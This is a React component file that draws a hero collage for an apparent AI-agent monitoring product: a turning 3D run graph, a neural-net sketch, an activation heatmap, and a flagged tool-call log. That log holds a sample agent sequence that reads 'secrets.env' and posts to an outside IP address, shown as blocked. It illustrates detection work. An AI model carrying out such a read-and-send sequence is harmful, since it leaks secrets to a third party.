import { useEffect, useMemo, useState } from 'react';
import type { Run } from '../model/types.ts';
import { useReducedMotion } from '../state/hooks.ts';

const BLUE = '#0645b1';
const RED = '#c8322b';
const CLAIM = '#e0b100';
const TILT_COS = Math.cos(0.45);
const TILT_SIN = Math.sin(0.45);

type Node3 = { id: string; x: number; y: number; z: number; r: number; fill: string; label: string | null };

/** Places the run's actors, records and events in 3D: agents on a ring, records outside it, each event between its two ends. */
function layout(run: Run): { nodes: Node3[]; links: [string, string][] } {
  const nodes: Node3[] = [];
  const agents = run.actors.filter((a) => a.kind === 'agent');
  agents.forEach((a, i) => {
    const t = (i / agents.length) * Math.PI * 2;
    nodes.push({ id: a.id, x: Math.cos(t) * 0.75, y: 0.2, z: Math.sin(t) * 0.75, r: 12, fill: BLUE, label: a.name });
  });
  run.actors.filter((a) => a.kind !== 'agent').forEach((a) => {
    nodes.push({ id: a.id, x: 0, y: -0.75, z: 0, r: 15, fill: RED, label: a.name });
  });
  run.records.forEach((rec, i) => {
    const t = (i / run.records.length) * Math.PI * 2 + 0.6;
    nodes.push({ id: rec.id, x: Math.cos(t) * 1.15, y: 0.55 - (i % 2) * 0.7, z: Math.sin(t) * 1.15, r: 10, fill: rec.planted ? CLAIM : '#8a8a8f', label: rec.label });
  });
  const at = new Map(nodes.map((n) => [n.id, n]));
  const links: [string, string][] = [];
  for (const e of run.events) {
    const a = at.get(e.actor);
    const b = e.target && at.get(e.target.id);
    if (!a || !b) continue;
    const jitter = ((e.seq * 37) % 11) / 30 - 0.18;
    nodes.push({ id: e.id, x: (a.x + b.x) / 2 + jitter, y: (a.y + b.y) / 2 - jitter, z: (a.z + b.z) / 2 + jitter, r: 4, fill: e.claim ? CLAIM : '#c4c4ca', label: null });
    links.push([a.id, e.id], [e.id, b.id]);
  }
  return { nodes, links };
}

/** The run as a slowly turning property graph, drawn the way a Neo4j browser shows one. */
function RunGraph({ run }: { run: Run }) {
  const reduced = useReducedMotion();
  const { nodes, links } = useMemo(() => layout(run), [run]);
  const [angle, setAngle] = useState(0.5);

  useEffect(() => {
    if (reduced) return;
    let raf = 0;
    const start = performance.now();
    const tick = (t: number) => {
      setAngle(0.5 + (t - start) / 9000);
      raf = requestAnimationFrame(tick);
    };
    raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, [reduced]);

  const cos = Math.cos(angle);
  const sin = Math.sin(angle);
  const projected = new Map(
    nodes.map((n) => {
      const x = n.x * cos - n.z * sin;
      const z0 = n.x * sin + n.z * cos;
      // A fixed downward tilt opens the ring into an ellipse so nodes in front do not hide those behind.
      const y = n.y * TILT_COS - z0 * TILT_SIN;
      const z = n.y * TILT_SIN + z0 * TILT_COS;
      const s = 3 / (3 + z);
      return [n.id, { ...n, px: 200 + x * 118 * s, py: 165 + y * 125 * s, s, z }];
    }),
  );
  const drawn = [...projected.values()].sort((a, b) => b.z - a.z);

  return (
    <svg viewBox="0 0 400 300" className="collage-svg" role="img" aria-label="The demo run as a 3D graph of agents, Chaser, records and events">
      <defs>
        <marker id="collage-arrow" viewBox="0 0 6 6" refX="5" refY="3" markerWidth="5" markerHeight="5" orient="auto">
          <path d="M0 0 L6 3 L0 6 Z" fill="#b5b5bc" />
        </marker>
      </defs>
      {links.map(([a, b]) => {
        const p = projected.get(a)!;
        const q = projected.get(b)!;
        return <line key={a + b} x1={p.px} y1={p.py} x2={q.px} y2={q.py} stroke="#c9c9cf" strokeWidth={0.9} markerEnd="url(#collage-arrow)" />;
      })}
      {drawn.map((n) => (
        <g key={n.id} opacity={0.55 + 0.45 * Math.min(1, n.s)}>
          <circle cx={n.px} cy={n.py} r={n.r * n.s} fill={n.fill} stroke="#fff" strokeWidth={1.5} />
          {n.label && (
            <text x={n.px} y={n.py + n.r * n.s + 11} textAnchor="middle" className="collage-node-label">{n.label}</text>
          )}
        </g>
      ))}
    </svg>
  );
}

/** A small feed-forward net with one highlighted path, standing for the hidden-layer probe. */
function NeuralNet() {
  const layers = [5, 7, 7, 4];
  const pos = layers.map((n, li) => Array.from({ length: n }, (_, i) => ({ x: 40 + li * 100, y: 150 + (i - (n - 1) / 2) * 34 })));
  const hot = [2, 3, 4, 1];
  return (
    <svg viewBox="0 0 380 300" className="collage-svg" role="img" aria-label="Neural network layers with one path lit up">
      {pos.slice(0, -1).map((col, li) =>
        col.flatMap((a, i) =>
          pos[li + 1].map((b, j) => (
            <line key={`${li}-${i}-${j}`} x1={a.x} y1={a.y} x2={b.x} y2={b.y} stroke="#dcdce2" strokeWidth={0.8} />
          )),
        ),
      )}
      {hot.slice(0, -1).map((i, li) => {
        const a = pos[li][i];
        const b = pos[li + 1][hot[li + 1]];
        return <line key={`hot-${li}`} x1={a.x} y1={a.y} x2={b.x} y2={b.y} className="collage-pulse" pathLength={1} />;
      })}
      {pos.map((col, li) =>
        col.map((p, i) => (
          <circle key={`${li}-${i}`} cx={p.x} cy={p.y} r={9} fill={hot[li] === i ? BLUE : '#fff'} stroke={hot[li] === i ? BLUE : '#9a9aa2'} strokeWidth={1.2} />
        )),
      )}
    </svg>
  );
}

/** Activation strength per layer and token; deterministic so the picture never jumps. */
function Heatmap() {
  const cols = 12;
  const rows = 7;
  const cells = [];
  for (let r = 0; r < rows; r += 1) {
    for (let c = 0; c < cols; c += 1) {
      const v = (Math.sin(r * 1.7 + c * 0.9) + Math.cos(c * 0.6 - r)) / 4 + 0.5;
      const hit = c === 8 && r > 1 && r < 6;
      cells.push(<rect key={`${r}-${c}`} x={c * 20 + 2} y={r * 20 + 2} width={17} height={17} rx={2} fill={hit ? RED : BLUE} opacity={hit ? 0.9 : 0.08 + v * 0.6} />);
    }
  }
  return (
    <svg viewBox="0 0 244 144" className="collage-svg" role="img" aria-label="Activation heatmap with one column flagged">
      {cells}
    </svg>
  );
}

/** What the black-box monitor sees: the agent's tool calls, with the harmful one flagged. Calls from the sandbox task set. */
const TOOL_CALLS = [
  { call: 'list_files(".")', bad: false },
  { call: 'read_file("config.yaml")', bad: false },
  { call: 'read_file("secrets.env")', bad: false },
  { call: 'http_post("45.77.10.2/collect")', bad: true },
];

function ToolCalls() {
  return (
    <ol className="collage-log" aria-label="Agent tool calls with the harmful one flagged">
      {TOOL_CALLS.map((t, i) => (
        <li key={t.call} className={t.bad ? 'is-bad' : ''}>
          <span>{String(i + 1).padStart(2, '0')}</span>
          {t.call}
          {t.bad && <b> blocked</b>}
        </li>
      ))}
    </ol>
  );
}

/** Hero picture: overlapping tiles over a grid and a blue wave, each tile drawn from what the product does. */
export function HeroCollage({ run }: { run: Run }) {
  return (
    <div className="collage" aria-label="Hero image">
      <svg className="collage-wave" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden="true">
        <defs>
          <linearGradient id="collage-wave-fill" x1="1" y1="0" x2="0.4" y2="1">
            <stop offset="0%" stopColor="#5b74d6" stopOpacity="0.85" />
            <stop offset="100%" stopColor="#e9edfb" stopOpacity="0.9" />
          </linearGradient>
        </defs>
        <path d="M0 90 C 30 88, 40 55, 62 50 S 88 30, 100 12 L100 100 L0 100 Z" fill="url(#collage-wave-fill)" />
      </svg>
      <figure className="collage-tile collage-tile--net"><NeuralNet /><figcaption>white-box · hidden layers</figcaption></figure>
      <figure className="collage-tile collage-tile--graph"><RunGraph run={run} /><figcaption>agent environment</figcaption></figure>
      <figure className="collage-tile collage-tile--heat"><Heatmap /><figcaption>activations</figcaption></figure>
      <figure className="collage-tile collage-tile--log"><ToolCalls /><figcaption>black-box · tool calls</figcaption></figure>
    </div>
  );
}
